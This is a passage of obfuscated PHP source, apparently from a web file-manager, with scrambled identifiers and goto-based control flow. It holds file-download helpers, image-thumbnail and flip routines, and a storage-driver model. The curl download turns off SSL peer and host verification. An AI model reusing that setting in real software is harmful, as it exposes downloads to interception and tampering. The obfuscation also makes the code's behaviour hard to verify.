(!$dÉœ‡ôŠ·) { return array($eÖ›Œ×óÈ‚[780] => !1, $eÖ›Œ×óÈ‚[782] => $eÖ›Œ×óÈ‚[785]); } if (!$bïƒº–Ã°[$eÖ›Œ×óÈ‚[1153]] || $bïƒº–Ã°[$eÖ›Œ×óÈ‚[328]] == 0) { @unlink($aÕ¨¦ŸÄ); @unlink($b’ò¢Ÿ‘¯); $fĞõœ‘Áå = self::fileDownloadFopen($dÉœ‡ôŠ·, $b’ò¢Ÿ‘¯, $bïƒº–Ã°[$eÖ›Œ×óÈ‚[328]]); if ($fĞõœ‘Áå[$eÖ›Œ×óÈ‚[780]]) { return $fĞõœ‘Áå; } else { @unlink($aÕ¨¦ŸÄ); @unlink($b’ò¢Ÿ‘¯); $fĞõœ‘Áå = self::fileDownloadCurl($dÉœ‡ôŠ·, $b’ò¢Ÿ‘¯, !1, 0, $bïƒº–Ã°[$eÖ›Œ×óÈ‚[328]]); @unlink($aÕ¨¦ŸÄ); return $fĞõœ‘Áå; } } $FÍˆÅ±ÈŠ = is_file($aÕ¨¦ŸÄ) ? filesize($aÕ¨¦ŸÄ) : 0; goto F¡˜†¢æîÕ; cÇ„©âœªö: $eÖ›Œ×óÈ‚ =& $_SERVER[İåâé¾]; if (!request_url_safe($dÉœ‡ôŠ·)) { return array($eÖ›Œ×óÈ‚[780] => !1, $eÖ›Œ×óÈ‚[782] => $eÖ›Œ×óÈ‚[785]); } $eØØ‹¸…õñ = $b’ò¢Ÿ‘¯ . $eÖ›Œ×óÈ‚[1151]; goto f–øÉñË˜Œ; d¸áÅ„¤§: } static function fileDownloadFopen($b§î°ÁÊ—, $cˆÖƒ¸—Ş…, $bÕ”Ø£¬òŒ = 0) { $dÛæÖèÌÏŠ =& $_SERVER[İåâé¾]; @ini_set($dÛæÖèÌÏŠ[1156], $dÛæÖèÌÏŠ[1157]); $b•™ê‹áµ¨ = $cˆÖƒ¸—Ş… . $dÛæÖèÌÏŠ[1152]; set_timeout(); @unlink($b•™ê‹áµ¨); if ($bˆÒÕ¡ = @fopen($b§î°ÁÊ—, $dÛæÖèÌÏŠ[1158])) { goto Bİ‚Ïˆ ¿ù; Bİ‚Ïˆ ¿ù: if (!($E‹Ïíëóê‚ = @fopen($b•™ê‹áµ¨, $dÛæÖèÌÏŠ[1159]))) { return array($dÛæÖèÌÏŠ[780] => !1, $dÛæÖèÌÏŠ[782] => $dÛæÖèÌÏŠ[1160]); } while (!feof($bˆÒÕ¡)) { if (!file_exists($b•™ê‹áµ¨)) { fclose($E‹Ïíëóê‚); return array($dÛæÖèÌÏŠ[780] => !1, $dÛæÖèÌÏŠ[782] => $dÛæÖèÌÏŠ[1161]); } clearstatcache(); if ($bÕ”Ø£¬òŒ > 0 && $bÕ”Ø£¬òŒ == filesize(iconv_system($b•™ê‹áµ¨))) { break; } fwrite($E‹Ïíëóê‚, fread($bˆÒÕ¡, 1024 * 8), 1024 * 8); } fclose($E‹Ïíëóê‚); goto F†…¢ºî¤æ; F©‰©Æ¬ÛŞ: self::checkGzip($b•™ê‹áµ¨); if (!@rename($b•™ê‹áµ¨, $cˆÖƒ¸—Ş…)) { usleep(round(rand(0, 1000) * 50)); @unlink($cˆÖƒ¸—Ş…); $dä„”¼°í = @rename($b•™ê‹áµ¨, $cˆÖƒ¸—Ş…); if (!$dä„”¼°í) { return array($dÛæÖèÌÏŠ[780] => !1, $dÛæÖèÌÏŠ[782] => $dÛæÖèÌÏŠ[1163]); } } return array($dÛæÖèÌÏŠ[780] => !0, $dÛæÖèÌÏŠ[782] => $dÛæÖèÌÏŠ[453]); goto aÇé¡¸ŸĞô; F†…¢ºî¤æ: fclose($bˆÒÕ¡); $e…£¢‹­ ´ = filesize(iconv_system($b•™ê‹áµ¨)); if ($bÕ”Ø£¬òŒ != 0 && $e…£¢‹­ ´ != $bÕ”Ø£¬òŒ) { return array($dÛæÖèÌÏŠ[780] => !1, $dÛæÖèÌÏŠ[782] => $dÛæÖèÌÏŠ[1162]); } goto F©‰©Æ¬ÛŞ; aÇé¡¸ŸĞô: } else { return array($dÛæÖèÌÏŠ[780] => !1, $dÛæÖèÌÏŠ[782] => $dÛæÖèÌÏŠ[1164]); } } static function fileDownloadCurl($dØà­ä‹ˆ, $c ‚•ÍÙËÁ, $eÇ÷«å = false, $Cö†Ûñ‰¾‘ = 0, $dç×ƒâ«˜ê = 0) { goto c¨ÛÎˆµÜÇ; e‰œ¡ˆè÷…: curl_setopt($b´ªùÂÛöâ, CURLOPT_NOPROGRESS, !1); curl_setopt($b´ªùÂÛöâ, CURLOPT_PROGRESSFUNCTION, $fœ…·§‰ã´[964]); curl_progress_start($b´ªùÂÛöâ); goto A«–­°Ï³‰; eŠÅÖŠí‹ß: if ($eÇ÷«å) { curl_setopt($b´ªùÂÛöâ, CURLOPT_RANGE, $Cö†Ûñ‰¾‘ . $fœ…·§‰ã´[470]); } curl_setopt($b´ªùÂÛöâ, CURLOPT_FILE, $dò¡³”ß·); curl_setopt($b´ªùÂÛöâ, CURLOPT_REFERER, get_url_link($dØà­ä‹ˆ)); goto b›ÍòÜÇÈ; DºùÙ‰ÌŠ: curl_close($b´ªùÂÛöâ); fclose($dò¡³”ß·); $bŸ‡«†Ú„‘ = filesize(iconv_system($FŸ„ŸøæáÔ)); goto dÍ¨ç“ø¾¿; fÖîÃªÃÍ: return array($fœ…·§‰ã´[780] => !1, $fœ…·§‰ã´[782] => $fœ…·§‰ã´[1167]); goto BŞÎÛËÖí•; A«–­°Ï³‰: curl_setopt($b´ªùÂÛöâ, CURLOPT_USERAGENT, $fœ…·§‰ã´[1157]); $Dƒ¹¦ÖÒù… = curl_exec($b´ªùÂÛöâ); curl_progress_end($b´ªùÂÛöâ); goto DºùÙ‰ÌŠ; b›ÍòÜÇÈ: curl_setopt($b´ªùÂÛöâ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($b´ªùÂÛöâ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($b´ªùÂÛöâ, CURLOPT_SSL_VERIFYHOST, 0); goto e‰œ¡ˆè÷…; dÍ¨ç“ø¾¿: if ($bŸ‡«†Ú„‘ < $dç×ƒâ«˜ê && $dç×ƒâ«˜ê != 0) { return array($fœ…·§‰ã´[780] => !1, $fœ…·§‰ã´[782] => $fœ…·§‰ã´[1154]); } if ($bŸ‡«†Ú„‘ > $dç×ƒâ«˜ê && $dç×ƒâ«˜ê != 0) { return array($fœ…·§‰ã´[780] => !1, $fœ…·§‰ã´[782] => $fœ…·§‰ã´[1162]); } if ($Dƒ¹¦ÖÒù… && filesize($FŸ„ŸøæáÔ) != 0) { self::checkGzip($FŸ„ŸøæáÔ); if (!@rename($FŸ„ŸøæáÔ, $c ‚•ÍÙËÁ)) { @unlink($c ‚•ÍÙËÁ); $Dƒ¹¦ÖÒù… = @rename($FŸ„ŸøæáÔ, $c ‚•ÍÙËÁ); if (!$Dƒ¹¦ÖÒù…) { return array($fœ…·§‰ã´[780] => !1, $fœ…·§‰ã´[782] => $fœ…·§‰ã´[1166]); } } return array($fœ…·§‰ã´[780] => !0, $fœ…·§‰ã´[782] => $fœ…·§‰ã´[453]); } goto fÖîÃªÃÍ; a—×áˆòÖÚ: $dò¡³”ß· = @fopen($FŸ„ŸøæáÔ, $fœ…·§‰ã´[477]); if (!$dò¡³”ß·) { return array($fœ…·§‰ã´[780] => !1, $fœ…·§‰ã´[782] => $fœ…·§‰ã´[1165]); } $b´ªùÂÛöâ = curl_init($dØà­ä‹ˆ); goto eŠÅÖŠí‹ß; c¨ÛÎˆµÜÇ: $fœ…·§‰ã´ =& $_SERVER[İåâé¾]; $FŸ„ŸøæáÔ = $c ‚•ÍÙËÁ . $fœ…·§‰ã´[1152]; set_timeout(); goto a—×áˆòÖÚ; BŞÎÛËÖí•: } static function checkGzip($B‚ßõİÈÒÌ) { goto CãùÖî‰ƒ¦; CãùÖî‰ƒ¦: $fùºÎƒÎ½ = $_SERVER[İåâé¾][1168]; $b°¥‡¤¢›¬ = file_sub_str($B‚ßõİÈÒÌ, 0, 2); if ($fùºÎƒÎ½ != $b°¥‡¤¢›¬) { return; } goto D¶ŸÑ§¹Ùà; D¶ŸÑ§¹Ùà: ob_start(); readgzfile($B‚ßõİÈÒÌ); $A£•áã¡Æà = ob_get_clean(); goto EÇ¯âº­Î¿; EÇ¯âº­Î¿: file_put_contents($B‚ßõİÈÒÌ, $A£•áã¡Æà); goto CˆºÈğì ; CˆºÈğì : } } goto f¹÷‚á±ŠÔ; A•È›½Ÿš: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($BÑßÈíÜÚ, $E ãòì‚Ó) { goto C»“„ìƒªÜ; EŠÃî¢·: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto B®ó‚²Ôİé; C»“„ìƒªÜ: $this->srcFile = $BÑßÈíÜÚ; $this->echoType = $E ãòì‚Ó; $this->im = self::image($BÑßÈíÜÚ); goto cè¢À¯¿; cè¢À¯¿: if (!$this->im) { return !1; } $A†¾”¤É = $_SERVER[İåâé¾][33]; $this->imgData = GetImageSize($BÑßÈíÜÚ, $A†¾”¤É); goto EŠÃî¢·; B®ó‚²Ôİé: } public static function image($DÄë³…Æ) { $e¹´ˆ¼Ôâ =& $_SERVER[İåâé¾]; $c¾Š“§å™¦ = $e¹´ˆ¼Ôâ[33]; $DàŸÅÈö²• = GetImageSize($DÄë³…Æ, $c¾Š“§å™¦); $f¨³Ì°È = !1; switch ($DàŸÅÈö²•[2]) { case IMAGETYPE_GIF: if (!function_exists($e¹´ˆ¼Ôâ[1255])) { break; } $f¨³Ì°È = imagecreatefromgif($DÄë³…Æ); break; case IMAGETYPE_JPEG: if (!function_exists($e¹´ˆ¼Ôâ[1256])) { break; } $f¨³Ì°È = imagecreatefromjpeg($DÄë³…Æ); break; case IMAGETYPE_PNG: if (!function_exists($e¹´ˆ¼Ôâ[1257])) { break; } $f¨³Ì°È = @imagecreatefrompng($DÄë³…Æ); imagesavealpha($f¨³Ì°È, !0); break; case IMAGETYPE_XBM: $f¨³Ì°È = imagecreatefromxbm($DÄë³…Æ); break; case IMAGETYPE_WBMP: $f¨³Ì°È = imagecreatefromwbmp($DÄë³…Æ); break; case IMAGETYPE_BMP: $f¨³Ì°È = imagecreatefrombmp($DÄë³…Æ); break; default: break; } return $f¨³Ì°È; } public static function imageSize($Aø£‹Ë†ˆÕ) { $bÂ²©ãà‚Å =& $_SERVER[İåâé¾]; $bÓ‰È‚É = GetImageSize($Aø£‹Ë†ˆÕ); if (!$bÓ‰È‚É) { return !1; } return array($bÂ²©ãà‚Å[212] => $bÓ‰È‚É[0], $bÂ²©ãà‚Å[898] => $bÓ‰È‚É[1]); } function distortion($FåÜóæ, $eØ‘ôÓ»ÜŒ, $CÄÆ‰ãŸÕ) { $E™ßøŠäôù = $this->creatImage($this->im, $eØ‘ôÓ»ÜŒ, $CÄÆ‰ãŸÕ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($E™ßøŠäôù, $FåÜóæ); } function prorate($A“½õåè¤×, $F¸»ß÷æã, $D¡ø§‹²í¬) { $D†Î¶šÎ = $F¸»ß÷æã / $D¡ø§‹²í¬; $c‹³ùŒó¼İ = $this->srcW / $this->srcH; if ($D†Î¶šÎ <= $c‹³ùŒó¼İ) { $eÖöÀ›ç–è = $F¸»ß÷æã; $cóô¨ÂÄÒ = $eÖöÀ›ç–è * ($this->srcH / $this->srcW); } else { $cóô¨ÂÄÒ = $D¡ø§‹²í¬; $eÖöÀ›ç–è = $cóô¨ÂÄÒ * ($this->srcW / $this->srcH); } if ($this->srcW > $F¸»ß÷æã || $this->srcH > $D¡ø§‹²í¬) { $bÒ¤Á°„Áó = $this->creatImage($this->im, $eÖöÀ›ç–è, $cóô¨ÂÄÒ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($bÒ¤Á°„Áó, $A“½õåè¤×); } else { $bÒ¤Á°„Áó = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($bÒ¤Á°„Áó, $A“½õåè¤×); } } function cut($b¦¶¡è“Ü„, $c™½Ë™ƒÖ, $c×èÊ›ÀÒÖ) { goto d’âÌ†”™»; d’âÌ†”™»: $cºÙäÙ½Éä = $c™½Ë™ƒÖ / $c×èÊ›ÀÒÖ; $cø«¢æí² = $this->srcW / $this->srcH; if ($cºÙäÙ½Éä <= $cø«¢æí²) { $b»ïİ¼Öê = $c×èÊ›ÀÒÖ; $D¥¿ñŒˆÀì = $b»ïİ¼Öê * ($this->srcW / $this->srcH); } else { $D¥¿ñŒˆÀì = $c™½Ë™ƒÖ; $b»ïİ¼Öê = $D¥¿ñŒˆÀì * ($this->srcH / $this->srcW); } goto díÊÙœòëÀ; Fö¹èµöí±: return $this->echoImage($F˜­åÀÕÄ«, $b¦¶¡è“Ü„); goto e–÷Äª·¾¸; díÊÙœòëÀ: $b„ŸÒ„ÀôÖ = $this->creatImage($this->im, $D¥¿ñŒˆÀì, $b»ïİ¼Öê, 0, 0, 0, 0, $this->srcW, $this->srcH); $F˜­åÀÕÄ« = $this->creatImage($b„ŸÒ„ÀôÖ, $c™½Ë™ƒÖ, $c×èÊ›ÀÒÖ, 0, 0, ($D¥¿ñŒˆÀì - $c™½Ë™ƒÖ) / 2, ($b»ïİ¼Öê - $c×èÊ›ÀÒÖ) / 2, $c™½Ë™ƒÖ, $c×èÊ›ÀÒÖ); imageDestroy($b„ŸÒ„ÀôÖ); goto Fö¹èµöí±; e–÷Äª·¾¸: } function backFill($Bˆ ‹²™, $f‰ÏßÕ”Â, $BäÁ©“±­¨, $Dƒ­¥Ïä ® = false, $e¢¯¨ƒš‡Ô = 255, $e¾¥§¼÷‡è = 255, $BæÜ½¾Ô„¢ = 255) { goto aÕŞ§ì¯Çã; E²ªÍ¥æ‰Ù: if (function_exists($_SERVER[İåâé¾][1258])) { @($F–‘²¾ğ£ = imageCreateTrueColor($f‰ÏßÕ”Â, $BäÁ©“±­¨)); if (!$F–‘²¾ğ£) { $F–‘²¾ğ£ = imageCreate($f‰ÏßÕ”Â, $BäÁ©“±­¨); } } else { $F–‘²¾ğ£ = imageCreate($f‰ÏßÕ”Â, $BäÁ©“±­¨); } $FÆæ¾æêéØ = ($BäÁ©“±­¨ - $dİ‡ĞÚ’³) / 2; $c¤‚™ÕÈëÅ = imagecolorallocate($F–‘²¾ğ£, $e¢¯¨ƒš‡Ô, $e¾¥§¼÷‡è, $BæÜ½¾Ô„¢); goto EÎ½È¦Æ¿¡; EÎ½È¦Æ¿¡: if ($Dƒ­¥Ïä ®) { $c¤‚™ÕÈëÅ = imageColorTransparent($F–‘²¾ğ£, $c¤‚™ÕÈëÅ); $FÆæ¾æêéØ = $BäÁ©“±­¨ - $dİ‡ĞÚ’³; } imageFilledRectangle($F–‘²¾ğ£, 0, 0, $f‰ÏßÕ”Â, $BäÁ©“±­¨, $c¤‚™ÕÈëÅ); if ($this->srcW > $f‰ÏßÕ”Â || $this->srcH > $BäÁ©“±­¨) { $bğî Ñ„õË = $this->creatImage($this->im, $DëğÂ±–Ş¶, $dİ‡ĞÚ’³, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($DëğÂ±–Ş¶ < $f‰ÏßÕ”Â) { imageCopy($F–‘²¾ğ£, $bğî Ñ„õË, ($f‰ÏßÕ”Â - $DëğÂ±–Ş¶) / 2, 0, 0, 0, $DëğÂ±–Ş¶, $dİ‡ĞÚ’³); } else { if ($dİ‡ĞÚ’³ < $BäÁ©“±­¨) { imageCopy($F–‘²¾ğ£, $bğî Ñ„õË, 0, $FÆæ¾æêéØ, 0, 0, $DëğÂ±–Ş¶, $dİ‡ĞÚ’³); } else { imageCopy($F–‘²¾ğ£, $bğî Ñ„õË, 0, 0, 0, 0, $DëğÂ±–Ş¶, $dİ‡ĞÚ’³); } } } else { imageCopyMerge($F–‘²¾ğ£, $this->im, ($f‰ÏßÕ”Â - $DëğÂ±–Ş¶) / 2, $FÆæ¾æêéØ, 0, 0, $DëğÂ±–Ş¶, $dİ‡ĞÚ’³, 100); } goto EŞ«ãÉÛÉĞ; EŞ«ãÉÛÉĞ: return $this->echoImage($F–‘²¾ğ£, $Bˆ ‹²™); goto aíöªÃ‚º; aÕŞ§ì¯Çã: $Fİß‚»Øƒ­ = $f‰ÏßÕ”Â / $BäÁ©“±­¨; $bòÇÔ¡Û›ä = $this->srcW / $this->srcH; if ($Fİß‚»Øƒ­ <= $bòÇÔ¡Û›ä) { $DëğÂ±–Ş¶ = $f‰ÏßÕ”Â; $dİ‡ĞÚ’³ = $DëğÂ±–Ş¶ * ($this->srcH / $this->srcW); } else { $dİ‡ĞÚ’³ = $BäÁ©“±­¨; $DëğÂ±–Ş¶ = $dİ‡ĞÚ’³ * ($this->srcW / $this->srcH); } goto E²ªÍ¥æ‰Ù; aíöªÃ‚º: } function creatImage($BÊâÑƒ³‡‚, $Fó…ÎÙİ’É, $D—ÆÑ”½È, $D­ë…Äî¹ñ, $e«ï„ áŞ±, $E•ˆŠäÈ¦ó, $c¼˜Ñ÷É‰, $e †îùõĞ, $AÚÈ¼öô„) { if (function_exists($_SERVER[İåâé¾][1258])) { @($bò¥™‹†òÌ = ImageCreateTrueColor($Fó…ÎÙİ’É, $D—ÆÑ”½È)); @imagealphablending($bò¥™‹†òÌ, !1); @imagesavealpha($bò¥™‹†òÌ, !0); if ($bò¥™‹†òÌ) { imageCopyResampled($bò¥™‹†òÌ, $BÊâÑƒ³‡‚, $D­ë…Äî¹ñ, $e«ï„ áŞ±, $E•ˆŠäÈ¦ó, $c¼˜Ñ÷É‰, $Fó…ÎÙİ’É, $D—ÆÑ”½È, $e †îùõĞ, $AÚÈ¼öô„); } else { $bò¥™‹†òÌ = ImageCreate($Fó…ÎÙİ’É, $D—ÆÑ”½È); imageCopyResized($bò¥™‹†òÌ, $BÊâÑƒ³‡‚, $D­ë…Äî¹ñ, $e«ï„ áŞ±, $E•ˆŠäÈ¦ó, $c¼˜Ñ÷É‰, $Fó…ÎÙİ’É, $D—ÆÑ”½È, $e †îùõĞ, $AÚÈ¼öô„); } } else { $bò¥™‹†òÌ = ImageCreate($Fó…ÎÙİ’É, $D—ÆÑ”½È); imageCopyResized($bò¥™‹†òÌ, $BÊâÑƒ³‡‚, $D­ë…Äî¹ñ, $e«ï„ áŞ±, $E•ˆŠäÈ¦ó, $c¼˜Ñ÷É‰, $Fó…ÎÙİ’É, $D—ÆÑ”½È, $e †îùõĞ, $AÚÈ¼öô„); } return $bò¥™‹†òÌ; } public function imgRotate($eÓ„©À³…Û, $EÜî£»ìŒÙ) { goto e Ç…êßÁ„; c‡­’Øå®‘: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $FĞîç“ÓÄ° = imagegif($C„Ê‚Éö§¶, $eÓ„©À³…Û); break; case IMAGETYPE_JPEG: $FĞîç“ÓÄ° = imagejpeg($C„Ê‚Éö§¶, $eÓ„©À³…Û, 100); break; case IMAGETYPE_PNG: $FĞîç“ÓÄ° = imagePNG($C„Ê‚Éö§¶, $eÓ„©À³…Û); break; default: break; } imageDestroy($C„Ê‚Éö§¶); imageDestroy($this->im); goto Aë”à áÉ£; Aë”à áÉ£: return $FĞîç“ÓÄ°; goto b¡—Ç£ã°ì; e Ç…êßÁ„: if (!$this->im || $EÜî£»ìŒÙ % 360 === 0 || !function_exists($_SERVER[İåâé¾][1259])) { return !1; } $C„Ê‚Éö§¶ = imageRotate($this->im, 360 - $EÜî£»ìŒÙ, 0); $FĞîç“ÓÄ° = !1; goto c‡­’Øå®‘; b¡—Ç£ã°ì: } function echoImage($B–Ş…Îã–Ÿ, $f‘ÍŒåù®½) { goto EÒ²¶‰¿ÒÅ; b¦àŠ®š‡Š: imageDestroy($this->im); return $F¶®›Å±Åí; goto DŠ¸õÃ„ğ; EÒ²¶‰¿ÒÅ: $FæÇ¹åÒÀß =& $_SERVER[İåâé¾]; if (!$B–Ş…Îã–Ÿ) { return !1; } ob_get_clean(); goto fãíÏ¯á³Õ; fãíÏ¯á³Õ: $F¶®›Å±Åí = !1; switch ($this->echoType) { case $FæÇ¹åÒÀß[1260]: $F¶®›Å±Åí = imagePNG($B–Ş…Îã–Ÿ); break; case $FæÇ¹åÒÀß[163]: $F¶®›Å±Åí = imagePNG($B–Ş…Îã–Ÿ, $f‘ÍŒåù®½); break; } imageDestroy($B–Ş…Îã–Ÿ); goto b¦àŠ®š‡Š; DŠ¸õÃ„ğ: } } if (!function_exists($_SERVER[İåâé¾][1261])) { define($_SERVER[İåâé¾][1262], 0); define($_SERVER[İåâé¾][1263], 1); define($_SERVER[İåâé¾][1264], 2); function imageflip($Cºõçˆ•×, $AßŒ¸¹ŞÈ‰) { switch ($AßŒ¸¹ŞÈ‰) { case IMG_FLIP_HORIZONTAL: $eÊŞå¸É½ = imagesx($Cºõçˆ•×) - 1; $b—Úğ–â¦ = $eÊŞå¸É½ / 2; $Eğ®àº†ì– = imagesy($Cºõçˆ•×); $Fš‘‡ÂÜ·º = imageistruecolor($Cºõçˆ•×) ? imagecreatetruecolor(1, $Eğ®àº†ì–) : imagecreate(1, $Eğ®àº†ì–); for ($b¶¯ƒƒ‚º‰ = 0; $b¶¯ƒƒ‚º‰ < $b—Úğ–â¦; ++$b¶¯ƒƒ‚º‰) { imagecopy($Fš‘‡ÂÜ·º, $Cºõçˆ•×, 0, 0, $b¶¯ƒƒ‚º‰, 0, 1, $Eğ®àº†ì–); imagecopy($Cºõçˆ•×, $Cºõçˆ•×, $b¶¯ƒƒ‚º‰, 0, $eÊŞå¸É½ - $b¶¯ƒƒ‚º‰, 0, 1, $Eğ®àº†ì–); imagecopy($Cºõçˆ•×, $Fš‘‡ÂÜ·º, $eÊŞå¸É½ - $b¶¯ƒƒ‚º‰, 0, 0, 0, 1, $Eğ®àº†ì–); } break; case IMG_FLIP_VERTICAL: $eõœÓÀµ¡ï = imagesx($Cºõçˆ•×); $C¹—·ö¿¤§ = imagesy($Cºõçˆ•×) - 1; $b÷÷“î¥º° = $C¹—·ö¿¤§ / 2; $Fš‘‡ÂÜ·º = imageistruecolor($Cºõçˆ•×) ? imagecreatetruecolor($eõœÓÀµ¡ï, 1) : imagecreate($eõœÓÀµ¡ï, 1); for ($cï¯•È•†š = 0; $cï¯•È•†š < $b÷÷“î¥º°; ++$cï¯•È•†š) { imagecopy($Fš‘‡ÂÜ·º, $Cºõçˆ•×, 0, 0, 0, $cï¯•È•†š, $eõœÓÀµ¡ï, 1); imagecopy($Cºõçˆ•×, $Cºõçˆ•×, 0, $cï¯•È•†š, 0, $C¹—·ö¿¤§ - $cï¯•È•†š, $eõœÓÀµ¡ï, 1); imagecopy($Cºõçˆ•×, $Fš‘‡ÂÜ·º, 0, $C¹—·ö¿¤§ - $cï¯•È•†š, 0, 0, $eõœÓÀµ¡ï, 1); } break; case IMG_FLIP_BOTH: $eõœÓÀµ¡ï = imagesx($Cºõçˆ•×); $Eğ®àº†ì– = imagesy($Cºõçˆ•×); $Fš‘‡ÂÜ·º = imagerotate($Cºõçˆ•×, 180, 0); imagecopy($Cºõçˆ•×, $Fš‘‡ÂÜ·º, 0, 0, 0, 0, $eõœÓÀµ¡ï, $Eğ®àº†ì–); break; default: return; } imagedestroy($Fš‘‡ÂÜ·º); } } if (!function_exists($_SERVER[İåâé¾][1265])) { function imagecreatefrombmp($D•¹ÅæšÖ±) { return imageGdBMP::load($D•¹ÅæšÖ±); } } goto f¸ê÷Ç¤Ô; F‘©Œâ²×Ğ: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\x2e\x73\164\157\162\x61\x67\x65\x4c\x69\x73\164"; public $field = array("\x6e\141\155\145", "\x73\151\172\x65\x4d\141\x78", "\x73\171\x73\x74\145\155", "\144\145\146\x61\x75\x6c\x74", "\x64\x72\151\166\145\x72", "\x63\x6f\x6e\x66\x69\x67"); public function listData($E†¡¤â­¦´ = false, $dĞÀã‘ÒÎ = "\x6d\157\144\x69\x66\171\x54\x69\x6d\x65", $b¡¦Âçäğ· = false) { goto aãÚôéßÈ‰; f¨ÈÌ·“»Ø: foreach ($f—Œ“ØÓ‚ as $cÙÆä‹…†™ => $F”ƒ‘—ŠÙ­) { unset($f—Œ“ØÓ‚[$cÙÆä‹…†™][$fï¶—àˆàŸ[6]]); $f—Œ“ØÓ‚[$cÙÆä‹…†™][$fï¶—àˆàŸ[1528]] = 0; } $E›¨¦Š˜Ñ« = array_to_keyvalue($f—Œ“ØÓ‚, $fï¶—àˆàŸ[33], $fï¶—àˆàŸ[368]); $this->_listAppendSize($f—Œ“ØÓ‚, $E›¨¦Š˜Ñ«); goto f±îƒã£³; f±îƒã£³: return $f—Œ“ØÓ‚; goto cÂÍÏëÊ½Ë; aãÚôéßÈ‰: $fï¶—àˆàŸ =& $_SERVER[İåâé¾]; $f—Œ“ØÓ‚ = parent::listData($E†¡¤â­¦´, $dĞÀã‘ÒÎ, $b¡¦Âçäğ·); if ($E†¡¤â­¦´) { return $f—Œ“ØÓ‚; } goto f¨ÈÌ·“»Ø; cÂÍÏëÊ½Ë: } public function _listAppendSize(&$FÇ‰ğÅš–´, $eéà¢í‚ØÖ) { $E‰Ô‚è‘¨ù =& $_SERVER[İåâé¾]; $eö©†¤‹áê = $E‰Ô‚è‘¨ù[1793] . implode($E‰Ô‚è‘¨ù[47], $eéà¢í‚ØÖ) . $E‰Ô‚è‘¨ù[1794]; $dÂåØÑ±œ­ = Model($E‰Ô‚è‘¨ù[479])->query($eö©†¤‹áê); $dÂåØÑ±œ­ = array_to_keyvalue($dÂåØÑ±œ­, $E‰Ô‚è‘¨ù[368], $E‰Ô‚è‘¨ù[78]); foreach ($FÇ‰ğÅš–´ as $C¨“ç®‘‹Ú => $b•†š‘†•) { $FÇ‰ğÅš–´[$C¨“ç®‘‹Ú][$E‰Ô‚è‘¨ù[1528]] = isset($dÂåØÑ±œ­[$b•†š‘†•[$E‰Ô‚è‘¨ù[368]]]) ? $dÂåØÑ±œ­[$b•†š‘†•[$E‰Ô‚è‘¨ù[368]]] : 0; } } public function getConfig($EÙÊ“…Íœ¡) { $B»Âªôàá = parent::listData($EÙÊ“…Íœ¡); return json_decode($B»Âªôàá[$_SERVER[İåâé¾][6]], !0); } public function update($EÁÖ¹±ëÃ, $F«ô·‹áÃà) { goto Bªß«‰Œ¶; Bªß«‰Œ¶: $BÎƒ–ë¼›¾ =& $_SERVER[İåâé¾]; $déĞÉ¬Šº = $F«ô·‹áÃà[$BÎƒ–ë¼›¾[28]]; $B¥ øÄĞ¢ = array_to_keyvalue(parent::listData(), $BÎƒ–ë¼›¾[28]); goto EÆ¦²Ñ™™¨; CÆå±šŸ: $b‚–ã‘¾¬Ã = parent::update($EÁÖ¹±ëÃ, $F«ô·‹áÃà); if ($b‚–ã‘¾¬Ã && $F«ô·‹áÃà[$BÎƒ–ë¼›¾[34]]) { foreach ($B¥ øÄĞ¢ as $AÇÇ¶Ãœ×˜) { if ($AÇÇ¶Ãœ×˜[$BÎƒ–ë¼›¾[34]] && $AÇÇ¶Ãœ×˜[$BÎƒ–ë¼›¾[368]] != $EÁÖ¹±ëÃ) { parent::update($AÇÇ¶Ãœ×˜[$BÎƒ–ë¼›¾[368]], array($BÎƒ–ë¼›¾[34] => 0)); } } } return $b‚–ã‘¾¬Ã; goto BÆ«¶–¯§î; EÆ¦²Ñ™™¨: if (isset($B¥ øÄĞ¢[$déĞÉ¬Šº]) && $B¥ øÄĞ¢[$déĞÉ¬Šº][$BÎƒ–ë¼›¾[368]] != $EÁÖ¹±ëÃ) { return !1; } if (isset($F«ô·‹áÃà[$BÎƒ–ë¼›¾[1795]]) && $F«ô·‹áÃà[$BÎƒ–ë¼›¾[1795]] == $BÎƒ–ë¼›¾[376]) { $this->checkConfig($F«ô·‹áÃà); } unset($F«ô·‹áÃà[$BÎƒ–ë¼›¾[1795]]); goto CÆå±šŸ; BÆ«¶–¯§î: } public function add($C¥‘á£‡åñ) { goto Dï°§ÆŠ¨¢; Dï°§ÆŠ¨¢: $FÛß–Ïõ§ =& $_SERVER[İåâé¾]; $a¨éÄõ·Ò = array_to_keyvalue(parent::listData(), $FÛß–Ïõ§[28]); if (isset($a¨éÄõ·Ò[$C¥‘á£‡åñ[$FÛß–Ïõ§[28]]])) { return !1; } goto e”÷šÛé÷ä; e”÷šÛé÷ä: $this->checkConfig($C¥‘á£‡åñ); $e ¡˜Ş›É = parent::insert($C¥‘á£‡åñ); if ($e ¡˜Ş›É && $C¥‘á£‡åñ[$FÛß–Ïõ§[34]]) { foreach ($a¨éÄõ·Ò as $D½Êß…Éé) { if ($D½Êß…Éé[$FÛß–Ïõ§[34]]) { parent::update($D½Êß…Éé[$FÛß–Ïõ§[368]], array($FÛß–Ïõ§[34] => 0)); } } } goto f‰‹óÙ¢çö; f‰‹óÙ¢çö: return $e ¡˜Ş›É; goto A™¸ãõ§‡Å; A™¸ãõ§‡Å: } public function checkConfig(&$A“š¸Á«Ù´) { goto dùæƒ‚ƒÊ¡; cÀÍõßÕ“°: $A¼®Ô³×ò» = $dœ²»ğŠÙÅ[72] . $dª¯áÔ¶Ÿ; $bëÃñÄ›§Ø = new $A¼®Ô³×ò»($A÷÷Ÿ¡â˜£); if (in_array($DÜß†¯Ñ°†, $bëÃñÄ›§Ø->objectDriver)) { if (!$bëÃñÄ›§Ø->isBucketCors() && !$bëÃñÄ›§Ø->setBucketCors()) { show_json(LNG($dœ²»ğŠÙÅ[1796]), !1); } } goto f««¹Óá°Ç; 